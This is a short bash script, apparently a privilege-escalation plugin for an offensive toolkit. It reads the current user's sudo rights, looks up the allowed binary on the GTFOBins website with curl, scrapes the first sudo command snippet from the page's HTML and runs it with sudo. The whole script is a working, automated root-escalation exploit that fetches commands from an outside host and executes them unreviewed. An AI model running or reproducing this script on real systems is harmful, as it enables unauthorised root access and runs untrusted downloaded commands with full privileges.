#!/bin/bash
# [PLUGIN PRIVESC] Sudo rights exploitation

res=$(sudo -l)
bin=$(echo $res | rev | cut -d'/' -f 1 | rev)
bin=${bin//$'\n'/}
if [[ $bin == *' '* ]]
then
    exit 1
else
    url="https://gtfobins.github.io/gtfobins/${bin}/#sudo"
    echo $url
    code=$(curl $url)
fi
if [[ $code == *'<pre><code>sudo'* ]]
then
    cmd=$(echo $code | awk -F'<pre><code>sudo' '{print $2}')
    cmd=${cmd//$'\n'/}
    cmd=$(echo $cmd | awk -F'</code></pre>' '{print $1}')
    'sudo' $cmd
else
    exit 1
fi
